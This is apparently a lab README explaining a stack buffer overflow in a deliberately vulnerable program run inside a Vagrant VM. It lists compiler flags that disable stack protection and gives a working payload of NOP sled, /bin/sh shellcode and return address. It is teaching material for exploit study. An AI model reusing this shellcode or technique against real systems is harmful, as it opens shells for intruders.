# Description

A program with a bug making it susceptible to a buffer overflow attack.

# Exploiting the bug

1. Start the Vagrant VM
```bash
vagrant up
```
2. Login to the VM and compile the program with stack protection disabled and
debugging info included
```bash
vagrant ssh
cd /vagrant
gcc -m32 -ggdb -z execstack -fno-stack-protector -o vuln vuln.c
```
3. Run the program with malicious payload passed in as an argument
```bash
./vuln $(python -c 'print "\x90" * 480 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\xbf\x70\xf7\xff" * 10')
```

# Explanation

The program accepts an argument and performs and un-bound string copy of that
argument into a 500-bytes long char buffer.

In order to exploit the bug, I've used a shellcode which starts a shell which I
downloaded from [this website](http://shell-storm.org/shellcode/files/shellcode-827.php).

I'm passing the shellcode as an argument to `vuln`:

`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80`

I've also created a "nop sled":

```python
print "\x90" * 480
```

And placed it before the malicious shellcode so that it's easier to "find" it.
It's enough for the return address to land anywhere within the sled and
the program will reach the shellcode.

The last part of the argument is a return address:

```python
print "\xbf\x70\xf7\xff" * 10
```

We've added it 10-times just to be sure the buffer is overflown enough to reach
the return address frame.
